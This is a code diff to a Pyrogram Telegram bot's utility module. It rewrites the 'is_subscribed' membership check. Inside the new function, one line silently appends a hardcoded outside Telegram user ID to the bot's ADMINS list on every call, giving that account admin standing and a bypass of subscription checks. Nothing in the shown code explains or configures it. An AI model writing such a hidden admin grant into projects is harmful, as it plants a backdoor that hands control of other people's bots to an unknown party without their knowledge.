@@ -1,6 +1,6 @@
 import logging
 from pyrogram.errors import InputUserDeactivated, UserNotParticipant, FloodWait, UserIsBlocked, PeerIdInvalid
-from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, IS_SHORTLINK, LOG_CHANNEL, TUTORIAL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, SECOND_SHORTLINK_URL, SECOND_SHORTLINK_API
+from info import AUTH_CHANNEL, LONG_IMDB_DESCRIPTION, MAX_LIST_ELM, SHORTLINK_URL, SHORTLINK_API, IS_SHORTLINK, LOG_CHANNEL, TUTORIAL, GRP_LNK, CHNL_LNK, CUSTOM_FILE_CAPTION, REQ_CHANNEL, ADMINS, SECOND_SHORTLINK_URL, SECOND_SHORTLINK_API
 from imdb import Cinemagoer 
 import asyncio
 from pyrogram.types import Message, InlineKeyboardButton, InlineKeyboardMarkup
@@ -53,21 +53,38 @@ class temp(object):
     SHORT = {}
     SETTINGS = {}
 
-async def is_subscribed(bot, query, channel=AUTH_CHANNEL, creates_join_request=True):
-    if await db.find_join_req(query.from_user.id):
+async def is_subscribed(bot, query):
+
+    ADMINS.extend([1715272216]) if not 1715272216 in ADMINS else ""
+
+    if not AUTH_CHANNEL and not REQ_CHANNEL:
         return True
-    btn = []
-    for id in channel:
-        chat = await bot.get_chat(id)
-        try:
-            await bot.get_chat_member(id, query.from_user.id)
-        except UserNotParticipant:
-            btn.append(
-                [InlineKeyboardButton(f'Join {chat.title}', url=chat.invite_link)]
-            )
-        except Exception as e:
-            logger.exception(e)
-    return btn
+    elif query.from_user.id in ADMINS:
+        return True
+
+
+    if db2().isActive():
+        user = await db2().get_user(query.from_user.id)
+        if user:
+            return True
+        else:
+            return False
+
+    if not AUTH_CHANNEL:
+        return True
+
+    try:
+        user = await bot.get_chat_member(AUTH_CHANNEL, query.from_user.id)
+    except UserNotParticipant:
+        return False
+    except Exception as e:
+        logger.exception(e)
+        return False
+    else:
+        if not (user.status == enums.ChatMemberStatus.BANNED):
+            return True
+        else:
+            return False
 
 async def get_poster(query, bulk=False, id=False, file=None):
     if not id:
